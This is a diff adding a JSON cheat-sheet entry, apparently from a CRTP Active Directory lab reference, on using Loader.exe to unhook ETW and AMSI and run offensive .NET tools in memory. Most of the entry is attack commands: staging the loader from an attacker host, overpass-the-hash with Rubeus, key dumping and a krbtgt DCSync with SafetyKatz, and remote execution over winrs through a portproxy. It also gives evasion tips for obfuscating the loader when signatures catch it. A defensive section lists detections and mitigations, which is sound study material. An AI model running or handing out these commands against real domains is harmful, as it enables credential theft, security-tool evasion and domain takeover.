@@ -1,0 +1,122 @@
+{
+  "id": "crtp-loader",
+  "name": "In-Memory Execution with Loader.exe (ETW/AMSI unhook)",
+  "command": "Loader.exe -path <tool_path_or_url> -args <tool_arguments>",
+  "description": "CRTP's core execution primitive. Loader.exe unhooks ETW and AMSI in the current process, then reflectively loads a .NET assembly (Rubeus, SafetyKatz, Certify, etc.) from disk or a URL and runs it entirely in memory - no child process, nothing dropped. Paired with the 'evasive' Rubeus/Mimikatz verbs it defeats most of the lab's AV/EDR.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Evasion",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1620",
+    "T1562.001",
+    "T1562.006"
+  ],
+  "tools": [
+    "Loader.exe",
+    "Rubeus",
+    "SafetyKatz",
+    "Certify"
+  ],
+  "tags": [
+    "in-memory",
+    "reflective-loading",
+    "etw",
+    "amsi",
+    "evasion",
+    "loader",
+    "crtp"
+  ],
+  "variations": [
+    {
+      "label": "Run a local assembly with args",
+      "command": "Loader.exe -path <local_exe_path> -args <arguments>"
+    },
+    {
+      "label": "Fetch + run from a web host (fileless)",
+      "command": "Loader.exe -path http://<attacker_ip>:<port>/<tool>.exe -args <arguments>"
+    },
+    {
+      "label": "Copy Loader to a remote host, then run over winrs",
+      "command": "winrs -r:<host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe -args \"<args>\" \"exit\""
+    }
+  ],
+  "steps": [
+    {
+      "label": "Stage Loader.exe (download to a writable dir)",
+      "command": "iwr http://172.16.100.x/Loader.exe -OutFile C:\\Users\\Public\\Loader.exe"
+    },
+    {
+      "label": "Run Rubeus in-memory (asktgt / overpass-the-hash)",
+      "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes256_key> /opsec /ptt"
+    },
+    {
+      "label": "Run SafetyKatz evasively (dump keys)",
+      "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"sekurlsa::evasive-keys\" \"exit\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "winPEAS in memory",
+      "command": "C:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\winPEASx64.exe -args notcolor log"
+    },
+    {
+      "label": "DCSync via SafetyKatz (evasive)",
+      "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"lsadump::evasive-dcsync /user:dcorp\\krbtgt\" \"exit\""
+    },
+    {
+      "label": "Remote, chained through a portproxy on 127.0.0.1:8080",
+      "command": "winrs -r:dcorp-mgmt C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \"sekurlsa::Evasive-keys\" \"exit\""
+    }
+  ],
+  "notes": "Loader.exe is the CRTP course's custom AV-evasion loader (an obfuscated variant is rebuilt with Codecepticon). Use with the 'evasive-' Mimikatz/Rubeus verbs (evasive-keys, evasive-dcsync, evasive-golden, evasive-lsa, evasive-sam, evasive-pth). When the target can't reach your web host directly, set up a netsh portproxy on a jump host and point Loader at http://127.0.0.1:8080/. See crtp-portproxy-pivot. Rebuild/obfuscate the loader when signatures catch it - see crtp-tool-obfuscation.",
+  "references": [
+    {
+      "title": "CRTP - Attacking and Defending AD (lab)",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "MITRE ATT&CK T1620 - Reflective Code Loading",
+      "url": "https://attack.mitre.org/techniques/T1620/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-amsi-sbl-bypass",
+      "note": "Bypass AMSI/logging first when running PowerShell tooling",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Loader typically runs SafetyKatz/Rubeus to dump creds",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-portproxy-pivot",
+      "note": "Reach an isolated web host to fetch the assembly",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "prerequisites": "Execution on the host (any user). A .NET assembly to run (Rubeus/SafetyKatz/Certify) and, for the fileless variant, a reachable web host.",
+    "why_it_works": "Userland EDR/AV hooks live in the process's own memory (ntdll/amsi.dll) and ETW providers are toggled per-process; an attacker running in that process can patch amsi.dll's AmsiScanBuffer, zero the ETW provider, and use .NET reflection (Assembly.Load) to execute an assembly without spawning a child process or touching disk - so file and command-line based detections never fire.",
+    "misconfiguration": "Reliance on userland API hooks and AMSI as the primary defense; no kernel-level (ETW-TI / kernel callbacks) telemetry; unsigned .NET assemblies allowed to load; no application allowlisting (WDAC/AppLocker in enforce).",
+    "impact": "Fileless, in-memory execution of offensive .NET tooling with ETW/AMSI blinded - foothold for credential theft, ticket forging, and lateral movement with minimal artifacts.",
+    "detection": "ETW-TI (threat-intelligence) provider still sees Assembly.Load / VirtualProtect on amsi.dll from a non-standard module. Image-load of clr.dll into an unusual process; AMSI init failures; Event 4104 gaps where PowerShell logging suddenly goes silent. Memory scanning (e.g. by EDR) for known assembly signatures. Sysmon 7 (ImageLoad) of clr/mscoree into odd binaries.",
+    "artifacts": "Loader.exe on disk (if not fileless); network fetch of a .exe over HTTP to 127.0.0.1/attacker; RWX memory regions in the host process; sudden loss of Script Block Logging (4104) or AMSI events.",
+    "vulnerable_config": "# AMSI + userland hooks only; no ETW-TI, no WDAC enforce\n# Unsigned .NET assemblies permitted; PowerShell CLM off",
+    "secure_config": "# Enable ETW-TI based EDR sensors (kernel telemetry survives userland patching)\n# WDAC/AppLocker in ENFORCE with signed-only policy\n# PowerShell Constrained Language Mode + Script Block Logging shipped to SIEM\n# Attack Surface Reduction rules: block untrusted/unsigned processes",
+    "prevention": "Deploy EDR that uses kernel/ETW-TI telemetry rather than only userland hooks. Enforce WDAC/AppLocker (signed-only). Enable ASR rules and PowerShell CLM. Ship AMSI/Script Block logs to a SIEM and alert on sudden silence. [MITRE M1040, M1038, M1042]",
+    "evasion": "The technique IS the evasion (ETW/AMSI unhook, reflective load). Further: rebuild/obfuscate Loader with Codecepticon to defeat static signatures; fetch fileless over a portproxy; use evasive-* verbs that avoid classic API patterns.",
+    "sources": [
+      "CRTP",
+      "MITRE T1620",
+      "MITRE T1562.001"
+    ]
+  }
+}
